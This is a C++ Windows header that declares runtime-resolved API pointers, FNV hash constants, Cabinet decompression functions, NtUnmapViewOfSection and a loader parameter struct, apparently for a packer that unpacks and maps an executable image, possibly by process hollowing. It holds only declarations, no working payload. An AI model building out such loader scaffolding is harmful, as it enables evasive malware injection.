#pragma once
#include <Windows.h>
#include <compressapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <string.h>

#define FNV_PRIME_32 16777619
#define FNV_OFFSET_32 2166136261U

#pragma comment(lib, "cabinet.lib") //needed for compressapi.h

#ifndef NTSTATUS
#define NTSTATUS	LONG
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#endif

using GetModuleHandleProto = HMODULE(WINAPI*)(LPCSTR);
using GetProcAddressProto = FARPROC(WINAPI*)(HMODULE, LPCSTR);
using VirtualProtectProto = BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD);
using VirtualAllocProto = LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD);
using GetCurrentProcessProto = HANDLE(WINAPI*)(VOID);
using VirtualQueryProto = SIZE_T(WINAPI*)(LPVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
using LoadLibraryAProto = HMODULE(WINAPI*)(LPCSTR);
using LocalFreeProto = HLOCAL(WINAPI*)(HLOCAL);
using LocalAllocProto = HLOCAL(WINAPI*)(UINT, SIZE_T);
using CreateDecompressorProto = BOOL(WINAPI*)(DWORD, PCOMPRESS_ALLOCATION_ROUTINES, PDECOMPRESSOR_HANDLE);
using DecompressProto = BOOL(WINAPI*)(DECOMPRESSOR_HANDLE, LPCVOID, SIZE_T, PVOID, SIZE_T, PSIZE_T);
using CloseDecompressorProto = BOOL(WINAPI*)(DECOMPRESSOR_HANDLE);
using NtUnmapViewOfSectionProto = NTSTATUS(NTAPI*) (HANDLE, LPVOID);

typedef struct {
	DWORD dwImageSize;
	DWORD dwImageBase;
	LPVOID lpImageMapping;
	LPVOID lpLoaderBase;
	LPVOID lpLoaderRelocatedBase;
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeaders;
	wchar_t pTargetPath[MAX_PATH];
	LPVOID pKernel32Base;
	LPVOID pCabinetBase;
	GetModuleHandleProto pGetModuleHandle;
	GetProcAddressProto pGetProcAddress;
	VirtualProtectProto pVirtualProtect;
	VirtualAllocProto pVirtualAlloc;
	GetCurrentProcessProto pGetCurrentProcess;
	VirtualQueryProto pVirtualQuery;
	LoadLibraryAProto pLoadLibraryA;
	LocalFreeProto pLocalFree;
	LocalAllocProto pLocalAlloc;
	CreateDecompressorProto pCreateDecompressor;
	DecompressProto pDecompress;
	CloseDecompressorProto pCloseDecompressor;
	NtUnmapViewOfSectionProto pNtUnmapViewOfSection;
}ONI_PARAM, * PONI_PARAM;
